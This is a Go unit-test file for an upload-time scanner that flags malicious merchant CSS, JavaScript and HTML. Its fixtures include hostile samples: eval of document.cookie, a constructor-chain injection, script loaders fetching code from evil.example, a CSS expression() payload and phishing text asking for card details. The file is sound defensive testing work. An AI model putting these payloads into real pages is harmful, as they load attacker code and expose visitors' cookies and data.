// Issue #364: unit tests for the deterministic code-asset scanner. These cover
// the cheap heuristics that run at upload time (and are re-run in the
// background worker) to flag obviously malicious / suspicious merchant CSS,
// JS and HTML before they are ever served.

package assetgate

import (
	"strings"
	"testing"
)

func TestDeterministicScanBenignPasses(t *testing.T) {
	cases := []struct {
		name string
		mime string
		data string
	}{
		{"simple-css", "text/css; charset=utf-8", "body { color: red; font-family: sans-serif; }\n.banner { background: #fff; padding: 12px; }"},
		{"minified-css-ok", "text/css; charset=utf-8", ".a{display:block}.b{margin:0 auto}@media(max-width:600px){.a{display:none}}"},
		{"css-keyframes", "text/css; charset=utf-8", "@keyframes spin {\n  from { transform: rotate(0deg); }\n  to { transform: rotate(360deg); }\n}"},
		{"simple-js", "text/javascript; charset=utf-8", "const greeting = 'hello';\ndocument.addEventListener('DOMContentLoaded', function () {\n  var el = document.getElementById('title');\n  el.textContent = greeting;\n});"},
		{"js-form-validate", "application/javascript; charset=utf-8", "function validate() {\n  var email = document.getElementById('email').value;\n  if (!email.match(/@/)) return false;\n  return true;\n}"},
		{"simple-html", "text/html; charset=utf-8", "<!doctype html><html><body><h1>Welcome</h1><p>Thanks for visiting.</p></body></html>"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := DeterministicScan([]byte(c.data), c.mime)
			if v.Status != StatusOK {
				t.Fatalf("scan(%q) = %q (%v), want %q", c.name, v.Status, v.Reasons, StatusOK)
			}
		})
	}
}

func TestDeterministicScanQuarantinesActiveCode(t *testing.T) {
	cases := []struct {
		name string
		mime string
		data string
	}{
		{"eval", "text/javascript; charset=utf-8", "eval(document.cookie);"},
		{"function-constructor", "text/javascript; charset=utf-8", "var x = new Function('return 1'); x();"},
		{"constructor-chain", "text/javascript; charset=utf-8", "a.constructor.constructor('alert(1)')();"},
		{"document-write", "text/javascript; charset=utf-8", "document.write('<script src=\"//evil.example/x.js\"></script>');"},
		{"css-expression", "text/css; charset=utf-8", "body { width: expression(alert(1)); }"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := DeterministicScan([]byte(c.data), c.mime)
			if v.Status != StatusQuarantined {
				t.Fatalf("scan(%q) = %q, want %q (reasons: %v)", c.name, v.Status, StatusQuarantined, v.Reasons)
			}
		})
	}
}

func TestDeterministicScanNeedsReview(t *testing.T) {
	cases := []struct {
		name string
		mime string
		data string
	}{
		{"long-base64", "text/javascript; charset=utf-8", strings.Repeat("A", 300)},
		{"external-js", "text/javascript; charset=utf-8", "var s = document.createElement('script'); s.src='https://evil.example/x.js'; document.body.appendChild(s);"},
		{"phishing-text", "text/html; charset=utf-8", "<!doctype html><html><body>Please verify your account and credit card details now.</body></html>"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := DeterministicScan([]byte(c.data), c.mime)
			if v.Status != StatusNeedsReview {
				t.Fatalf("scan(%q) = %q, want %q (reasons: %v)", c.name, v.Status, StatusNeedsReview, v.Reasons)
			}
		})
	}
}

// CSS with a legitimate external font URL must NOT be flagged (it is a normal
// landing-page pattern), while JS loading an external script should be.
func TestDeterministicScanCSSExternalFontsAreFine(t *testing.T) {
	css := "@import url('https://fonts.example.com/family=Open+Sans');\n@font-face { src: url('https://cdn.example.com/font.woff2'); }"
	v := DeterministicScan([]byte(css), "text/css; charset=utf-8")
	if v.Status != StatusOK {
		t.Fatalf("css with external font = %q (%v), want %q", v.Status, v.Reasons, StatusOK)
	}
}

func TestHasExternalURL(t *testing.T) {
	if !hasExternalURL("https://evil.example/x.js") {
		t.Error("evil.example should be external")
	}
	if hasExternalURL("https://jomform.com/x.js") {
		t.Error("jomform.com should not be external")
	}
	if hasExternalURL("https://wanzulhosting.jomform.com/x.js") {
		t.Error("a jomform subdomain should not be external")
	}
	// A JS file loading a font CDN — external URL in JS is flagged as
	// needs-review (deterministic) regardless of being a legit CDN.
	if !hasExternalURL("var fonts = { url: 'https://fonts.gstatic.com/x.woff2' }") {
		t.Error("external CDN URL inside JS should be detected")
	}
	if !hasExternalURL("var x = 'https://evil.example'") {
		t.Error("external URL inside a JS string should be detected")
	}
}

func TestLongestBase64Run(t *testing.T) {
	if got := longestBase64Run("abc" + strings.Repeat("Q", 300) + "xyz"); got < 300 {
		t.Fatalf("longestBase64Run = %d, want >= 300", got)
	}
	if got := longestBase64Run("short text with no long runs"); got >= 16 {
		t.Fatalf("expected no run >=16, got %d", got)
	}
}
